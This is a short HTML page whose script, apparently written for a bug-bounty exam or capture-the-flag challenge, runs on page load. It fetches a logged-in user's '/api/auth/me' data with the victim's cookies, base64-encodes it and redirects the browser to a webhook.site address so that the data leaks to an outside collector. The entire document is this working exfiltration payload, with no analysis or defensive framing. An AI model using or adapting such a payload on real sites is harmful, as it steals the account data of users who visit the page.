<!DOCTYPE html>
<html>
<body>
    <script>
        async function leak() {
            const webhook = "https://webhook.site/0279174a-c77a-4643-aa9c-0251998890b0";
            const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/me";

            try {
                const res = await fetch(target, {credentials: "include"});
                const data = await res.text();
                // We encode the data so it doesn't break the URL
                window.location.href = webhook + "?flag_data=" + btoa(data);
            } catch (e) {
                window.location.href = webhook + "?err=" + btoa(e.message);
            }
        }
        leak();
    </script>
</body>
